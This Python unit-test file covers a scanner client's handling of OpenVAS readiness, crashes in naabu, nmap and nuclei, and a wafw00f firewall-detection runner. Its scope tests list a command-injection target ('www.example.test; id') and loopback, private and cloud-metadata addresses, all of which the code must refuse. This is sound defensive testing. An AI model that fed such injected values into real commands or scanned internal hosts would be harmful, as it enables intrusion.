    def test_a_failing_readiness_check_is_not_ready_never_an_exception(self):
        with mock.patch('client.openvas.readiness', side_effect=PermissionError(13, 'Permission denied', '/run/gvmd/gvmd.sock')):
            ready, why = tools.gvm_status(now=10)
        self.assertFalse(ready)
        self.assertIn('PermissionError', why)
        self.assertNotIn('/run/gvmd', why)

    def test_one_check_at_a_time_and_the_others_get_the_cached_answer(self):
        release, entered = threading.Event(), threading.Event()

        def slow_readiness():
            entered.set()
            release.wait(5)
            return True, ''
        with mock.patch('client.openvas.readiness', side_effect=slow_readiness) as readiness:
            worker = threading.Thread(target=tools.gvm_status, kwargs={'now': 10})
            worker.start()
            self.assertTrue(entered.wait(5))
            self.assertEqual(tools.gvm_status(now=10), (False, 'not checked yet'))  # did not wait, did not check again
            release.set()
            worker.join(5)
            self.assertEqual(readiness.call_count, 1)
        self.assertEqual(tools.gvm_status(now=11), (True, ''))


class ToolExitTests(unittest.TestCase):
    """A tool that crashed or was killed must never read as an empty result."""

    def script(self, body):
        handle = tempfile.NamedTemporaryFile('w', suffix='.sh', delete=False)
        handle.write('#!/bin/sh\n' + body + '\n')
        handle.close()
        os.chmod(handle.name, 0o755)
        self.addCleanup(os.unlink, handle.name)
        return handle.name

    def test_a_non_zero_exit_is_an_error_even_with_no_output(self):
        with self.assertRaises(tools.ToolExitError) as ctx:
            tools._run(['sh', '-c', 'echo boom >&2; exit 3'], 10)
        self.assertIn('status 3', str(ctx.exception))
        self.assertIn('boom', str(ctx.exception))

    def test_a_non_zero_exit_with_partial_output_is_still_an_error(self):
        with self.assertRaises(tools.ToolExitError):
            tools._run(['sh', '-c', 'echo partial; exit 1'], 10)

    def test_a_killed_tool_is_an_error(self):
        with self.assertRaises(tools.ToolExitError) as ctx:
            tools._run(['sh', '-c', 'kill -9 $$'], 10)
        self.assertIn('-9', str(ctx.exception))

    def test_a_clean_exit_returns_its_output(self):
        self.assertEqual(tools._run(['sh', '-c', 'echo ok'], 10).strip(), 'ok')

    def test_naabu_nmap_and_nuclei_report_a_crash_not_an_empty_answer(self):
        crash = self.script('exit 2')
        with mock.patch.object(tools, 'NAABU_BIN', crash), self.assertRaises(tools.ToolExitError):
            tools.run_naabu(['8.8.8.8'])
        with mock.patch.object(tools, 'NMAP_BIN', crash), self.assertRaises(tools.ToolExitError):
            tools.run_nmap(['8.8.8.8'])
        with mock.patch.object(tools, 'NUCLEI_BIN', crash), self.assertRaises(tools.ToolExitError):
            tools.run_nuclei(['8.8.8.8'])


if __name__ == '__main__':
    unittest.main()


class WafRunnerTests(unittest.TestCase):
    """``waf``: wafw00f at the root of one site, the result exactly the contract's (a name per product, no version, no confidence)."""

    REPORT = json.dumps([
        {'detected': True, 'firewall': 'FortiWeb', 'manufacturer': 'Fortinet', 'url': 'https://www.example.test/', 'trigger_url': 'https://www.example.test/?x=1'},
        {'detected': True, 'firewall': 'fortiweb', 'manufacturer': 'Fortinet'},
        {'detected': True, 'firewall': 'Generic', 'manufacturer': 'Unknown'},
        {'detected': True, 'firewall': 'ExampleShield', 'manufacturer': ''},
        {'detected': False, 'firewall': 'None', 'manufacturer': 'None'}])

    def run_waf(self, *args, report=REPORT, **kwargs):
        """``run_waf`` with a fake wafw00f: it writes ``report`` where ``-o`` says (nothing when ``report`` is None). Returns (result, argv)."""
        seen = []

        def fake_run(argv, timeout, register=None, max_bytes=None):
            seen.append((argv, timeout))
            if report is not None:
                with open(argv[argv.index('-o') + 1], 'w', encoding='utf-8') as handle:
                    handle.write(report)
            return 'banner and progress that are never read'
        with mock.patch('client.tools._run', side_effect=fake_run):
            result = tools.run_waf(*args, **kwargs)
        return result, seen[0][0], seen[0][1]

    def test_the_runner_is_registered_and_the_result_is_the_contracts_shape(self):
        self.assertIs(tools.RUNNERS['waf'], tools.run_waf)
        result, argv, timeout = self.run_waf('www.example.test', '93.184.215.14', 443, 'https')
        self.assertEqual(result, {'products': [{'name': 'FortiWeb', 'manufacturer': 'Fortinet'}, {'name': 'ExampleShield'}], 'generic': False})
        self.assertEqual(argv[:9], [tools.WAFW00F_BIN, '-a', '-r', '-T', '15', '--no-colors', '-f', 'json', '-o'])
        self.assertEqual(argv[10:], ['https://www.example.test/'])
        self.assertEqual(timeout, 60)

    def test_a_generic_block_names_no_product_and_no_waf_is_not_generic(self):
        report = json.dumps([{'detected': True, 'firewall': 'Generic', 'manufacturer': 'Unknown'}])
        self.assertEqual(self.run_waf('www.example.test', '93.184.215.14', 443, 'https', report=report)[0], {'products': [], 'generic': True})
        report = json.dumps([{'detected': False, 'firewall': 'None', 'manufacturer': 'None'}])
        self.assertEqual(self.run_waf('www.example.test', '93.184.215.14', 443, 'https', report=report)[0], {'products': [], 'generic': False})

    def test_products_and_names_are_capped_to_the_contracts_bounds(self):
        report = json.dumps([{'detected': True, 'firewall': f'{i:02}' + 'n' * 150, 'manufacturer': 'm' * 150} for i in range(30)])
        result = self.run_waf('www.example.test', '93.184.215.14', 443, 'https', report=report)[0]
        self.assertEqual(len(result['products']), 20)
        self.assertEqual({len(p['name']) for p in result['products']}, {100})
        self.assertEqual({tuple(sorted(p)) for p in result['products']}, {('manufacturer', 'name')})  # no version, no confidence

    def test_the_url_is_the_root_of_the_site_with_the_port_only_when_it_is_not_the_schemes_own(self):
        cases = [(('www.example.test', '93.184.215.14', 8443, 'https'), 'https://www.example.test:8443/'),
                 (('www.example.test', '93.184.215.14', 80, 'http'), 'http://www.example.test/'),
                 (('www.example.test', '93.184.215.14', 8080, 'http'), 'http://www.example.test:8080/'),
                 (('WWW.Example.Test.', '93.184.215.14', 443, 'https'), 'https://www.example.test/'),
                 (('93.184.215.14', '93.184.215.14', 443, 'https'), 'https://93.184.215.14/'),
                 (('2606:4700::6810:1', '2606:4700::6810:1', 8443, 'https'), 'https://[2606:4700::6810:1]:8443/')]
        for args, url in cases:
            with self.subTest(url=url):
                self.assertEqual(self.run_waf(*args)[1][-1], url)

    def test_the_request_timeout_never_exceeds_the_runs_own(self):
        argv = self.run_waf('www.example.test', '93.184.215.14', 443, 'https', timeout=10)[1]
        self.assertEqual(argv[argv.index('-T') + 1], '10')

    def test_a_site_that_never_answered_or_an_unreadable_report_is_an_error_not_no_waf(self):
        for report in ('[]', '', 'not json', '{"detected": false}', None):
            with self.subTest(report=report), self.assertRaises(tools.ToolOutputError):
                self.run_waf('www.example.test', '93.184.215.14', 443, 'https', report=report)

    def test_a_target_scope_or_the_syntax_refuses_runs_nothing(self):
        refused = [('localhost', '93.184.215.14', 443, 'https'), ('www.example.test', '127.0.0.1', 443, 'https'),
                   ('www.example.test', '10.0.0.5', 443, 'https'), ('www.example.test', '169.254.169.254', 443, 'https'),
                   ('www.example.test', '172.19.0.2', 443, 'https'), ('10.1.2.3', '93.184.215.14', 443, 'https'),
                   ('www.example.test', '93.184.215.14/24', 443, 'https'), ('www.example.test/x', '93.184.215.14', 443, 'https'),
                   ('www.example.test; id', '93.184.215.14', 443, 'https'), ('priv.example.test', '93.184.215.14', 443, 'https'),
                   ('', '93.184.215.14', 443, 'https'), ('www.example.test', '', 443, 'https'),
                   ('www.example.test', '93.184.215.14', 0, 'https'), ('www.example.test', '93.184.215.14', 65536, 'https'),
                   ('www.example.test', '93.184.215.14', '443', 'https'), ('www.example.test', '93.184.215.14', True, 'https'),
                   ('www.example.test', '93.184.215.14', 443, 'ftp'), ('www.example.test', '93.184.215.14', 443, ''),
                   ('www.example.test', '93.184.215.14', 443, None)]
        with mock.patch.dict(NAMES, {'priv.example.test': ['10.0.0.9']}), mock.patch('client.tools._run') as fake_run:
            for args in refused:
                with self.subTest(args=args), self.assertRaises(tools.TargetError):
                    tools.run_waf(*args)
        fake_run.assert_not_called()

    def test_a_private_site_is_scanned_only_by_an_internal_sentinel(self):
        with mock.patch.object(scope, 'internal_allowed', return_value=True), mock.patch.dict(NAMES, {'files.example.test': ['10.0.0.9']}):
            result, argv, _timeout = self.run_waf('files.example.test', '10.0.0.9', 8080, 'http')
        self.assertEqual(argv[-1], 'http://files.example.test:8080/')
        self.assertEqual(result['products'][0]['name'], 'FortiWeb')

    def test_a_timeout_propagates_so_the_task_is_an_error(self):
        with mock.patch('client.tools._run', side_effect=subprocess.TimeoutExpired('wafw00f', 60)), self.assertRaises(subprocess.TimeoutExpired):
            tools.run_waf('www.example.test', '93.184.215.14', 443, 'https')


class WafProcessTests(unittest.TestCase):
    """The same runner against a real (fake) executable, so the argv, the output file and the exit status are the real thing."""

    def script(self, body):
        handle = tempfile.NamedTemporaryFile('w', suffix='.sh', delete=False)
        handle.write('#!/bin/sh\n' + body + '\n')
        handle.close()
        os.chmod(handle.name, 0o755)
        self.addCleanup(os.unlink, handle.name)
        return handle.name

    def test_a_fake_wafw00f_is_run_with_the_fixed_flags_and_its_report_is_read(self):
        argv_file = tempfile.NamedTemporaryFile(delete=False)
        argv_file.close()
        self.addCleanup(os.unlink, argv_file.name)
        fake = self.script(f'''printf '%s\\n' "$@" > {argv_file.name}
while [ $# -gt 0 ]; do if [ "$1" = -o ]; then out="$2"; fi; shift; done
echo 'a banner on stdout'
echo '[{{"detected": true, "firewall": "ExampleShield", "manufacturer": "Example Inc"}}]' > "$out"''')
        with mock.patch.object(tools, 'WAFW00F_BIN', fake):
            result = tools.run_waf('www.example.test', '93.184.215.14', 443, 'https')
        self.assertEqual(result, {'products': [{'name': 'ExampleShield', 'manufacturer': 'Example Inc'}], 'generic': False})
        with open(argv_file.name, encoding='utf-8') as handle:
            argv = handle.read().split('\n')
        self.assertEqual(argv[:8], ['-a', '-r', '-T', '15', '--no-colors', '-f', 'json', '-o'])
        self.assertEqual(argv[9], 'https://www.example.test/')

    def test_a_crash_is_an_error_and_never_an_empty_result(self):
        fake = self.script('echo "Traceback: boom" >&2; exit 1')
        with mock.patch.object(tools, 'WAFW00F_BIN', fake), self.assertRaises(tools.ToolExitError):
            tools.run_waf('www.example.test', '93.184.215.14', 443, 'https')

    def test_a_site_that_is_down_leaves_an_empty_list_and_is_an_error(self):
        fake = self.script('while [ $# -gt 0 ]; do if [ "$1" = -o ]; then out="$2"; fi; shift; done\necho "[]" > "$out"')
        with mock.patch.object(tools, 'WAFW00F_BIN', fake), self.assertRaises(tools.ToolOutputError):
            tools.run_waf('www.example.test', '93.184.215.14', 443, 'https')


class WafResultContractTests(unittest.TestCase):
    """What the runner returns, wrapped the way the daemon reports it, is valid against the packaged contract."""

    def test_the_reported_result_validates_for_the_waf_kind(self):
        from jsonschema import Draft202012Validator

        from cvengine_scanner import contract
        check = Draft202012Validator(contract.result_schema('waf'))
        report = json.dumps([{'detected': True, 'firewall': 'FortiWeb', 'manufacturer': 'Fortinet'}, {'detected': True, 'firewall': 'ExampleShield'},
                             {'detected': True, 'firewall': 'Generic'}])
        for text in (report, json.dumps([{'detected': True, 'firewall': 'Generic'}]), json.dumps([{'detected': False, 'firewall': 'None'}])):
            with self.subTest(text=text):
                reported = {'outcome': 'done', **tools.parse_waf_output(text, strict=True)}
                self.assertEqual(list(check.iter_errors(reported)), [])
